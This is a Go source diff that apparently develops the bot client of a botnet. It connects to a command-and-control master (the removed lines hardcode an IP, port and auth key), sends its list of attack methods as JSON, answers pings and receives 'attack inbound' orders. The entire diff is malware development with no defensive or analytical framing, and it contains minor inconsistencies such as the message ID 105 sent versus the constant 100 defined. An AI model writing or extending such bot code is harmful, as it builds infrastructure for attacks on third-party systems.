@@ -7,14 +7,25 @@ import (
 	"net"
 	"os"
 	"time"
+  "encoding/json"
 )
 
 var (
-	CurrentID = 0
-	logger    = log.New(os.Stderr, "[yumeko/bot] ", log.Ltime|log.Lshortfile)
-	conn      net.Conn
+	CurrentID 		 = 0
+	logger    		 = log.New(os.Stderr, "[yumeko/bot] ",log.Ltime)
+	MethodsLogger    = log.New(os.Stderr, "[methods] ", 0)
+	methods          map[string]interface{}
+	conn      		 net.Conn
 )
-
+const (
+	MessageAuthenticate = iota
+	MessageSuccess      = iota
+	MessageFailure      = iota
+	MessageAttack       = iota
+	MessagePing         = iota
+	MessageStop         = iota
+	MessageMethods 		= 100
+)
 func main() {
 	Load()
 	LoadMethods()
@@ -24,7 +35,7 @@ connect:
 		time.Sleep(5 * time.Second)
 		goto connect
 	}
-	if _, err := conn.Write([]byte("keyasifhaw")); err != nil {
+	if _, err := conn.Write([]byte(Config.Key)); err != nil {
 		logger.Println(err)
 		goto connect
 	}
@@ -41,7 +52,35 @@ connect:
 		}
 		switch msg.ID {
 		case 1:
-			logger.Println("succesfully authenticated!")
+			logger.Println("successfully authenticated!")
+			var methodNames []string
+			for methodName := range methods {
+				methodNames = append(methodNames, methodName)
+			}
+      
+      jsonData, err := json.Marshal(methodNames)
+	    if err != nil {
+		    fmt.Println("Error encoding to JSON:", err)
+		    return
+    	}
+
+      
+			// Send Methods message
+			_, encodedMethods := NewMessage(105, string(jsonData))
+			conn.Write(encodedMethods)
+			
+			// Wait for server's response and update CurrentID
+			msg, err := ReadMessage(conn)
+			if err != nil {
+				logger.Println("Error receiving server response:", err)
+				continue
+			}
+			
+			// Assuming the response message contains the updated CurrentID
+			if msg.ID == MessageSuccess {
+				logger.Printf("Server synced, new CurrentID: %s", string(msg.Content))
+
+			}
 		case 3:
 			logger.Println("attack inbound! reading data!")
 			info, err := ReadAttack(conn)
@@ -54,13 +93,15 @@ connect:
 			logger.Println("ping!")
 			_, bytes = NewMessage(4, "pong!")
 			conn.Write(bytes)
+		case 5:
+			logger.Println("Methods sent to the server")
 		}
 	}
 }
 
 func connect() error {
 	CurrentID = 0
-	connnection, err := net.Dial("tcp", "139.99.135.166:12345")
+	connnection, err := net.Dial("tcp", Config.Master)
 	if err != nil {
 		return err
 	}
